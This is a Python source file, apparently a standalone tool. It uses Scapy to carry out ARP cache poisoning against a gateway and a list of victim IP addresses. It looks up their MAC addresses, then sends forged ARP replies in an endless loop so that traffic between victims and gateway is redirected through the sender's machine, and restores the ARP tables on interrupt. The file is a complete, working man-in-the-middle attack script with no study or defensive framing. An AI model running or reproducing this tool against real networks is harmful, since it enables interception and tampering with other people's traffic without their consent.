import time

from scapy.all import *


class ARPPoison:	
	def __init__(self, gateway_ip, victims_ip, sleep_time = 1.5):
		self.sleep_time = sleep_time
		self.victims_info_list = []
		self.spoof_packages_list = []
		self.reset_packages_list = []
		
		gateway_mac = self._get_mac_address(gateway_ip)
		self.gateway_info = dict(
			ip = gateway_ip,
			mac = gateway_mac
		)

		self._create_victims_info_list(victims_ip)
		self._create_spoof_packages()
		self._create_reset_packages()
		pass

	def run(self):
		try:
			while True:
				self._spoof()
				time.sleep(self.sleep_time)
		except KeyboardInterrupt:
			self._reset()
			print("Stop spoofing. Reset arp table success!")
		pass
	
	def _spoof(self):
		for packages in self.spoof_packages_list:
			victim_package = packages.get("victim_package")
			gateway_package = packages.get("gateway_package")
	
			self._send_package(victim_package)
			self._send_package(gateway_package)
		
		pass
	
	def _reset(self):
		for packages in self.reset_packages_list:
			victim_package = packages.get("victim_package")
			gateway_package = packages.get("gateway_package")

			self._send_package(victim_package)
			self._send_package(gateway_package)
		pass

	def _create_spoof_packages(self):
		for victim_info in self.victims_info_list:
			package_to_victim = ARP(
				op = 2,
				psrc = self.gateway_info.get("ip"),
				pdst = victim_info.get("ip"),
				hwdst = victim_info.get("mac"),
			)

			package_to_gateway = ARP(
				op = 2,
				psrc = victim_info.get("ip"),
				pdst = self.gateway_info.get("ip"),
				hwdst = self.gateway_info.get("mac")
			)

			packages = dict(
				victim_package = package_to_victim,
				gateway_package = package_to_gateway
			)

			self.spoof_packages_list.append(packages)
		pass

	def _create_reset_packages(self):
		for victim_info in self.victims_info_list:
			package_to_victim = ARP(
				op = 2,
				psrc = self.gateway_info.get("ip"),
				hwsrc = self.gateway_info.get("mac"),
				pdst = victim_info.get("ip"),
				hwdst = victim_info.get("mac")
			)

			package_to_gateway = ARP(
				op = 2,
				psrc = victim_info.get("ip"),
				hwsrc = victim_info.get("mac"),
				pdst = self.gateway_info.get("ip"),
				hwdst = self.gateway_info.get("mac")
			)

			packages = dict(
				victim_package = package_to_victim,
				gateway_package = package_to_gateway
			)

			self.reset_packages_list.append(packages)
		pass

	def _send_package(self, package):
		send(package, verbose = False)
		pass

	def _create_victims_info_list(self, ip_address_list):
		for ip in ip_address_list:
			mac = self._get_mac_address(ip)
			info = dict(ip = ip, mac = mac)
			self.victims_info_list.append(info)

		pass

	def _get_mac_address(self, ip_address):
		try:
			broadcast_package = Ether(dst = "ff:ff:ff:ff:ff:ff")/ARP(op = 1, pdst = ip_address)
			received = srp(
				broadcast_package,
				timeout = 3,
				verbose = False
			)
		
			return received[0][0][1].hwsrc
		except:
			print("mac addresses unreachable.")
			exit()
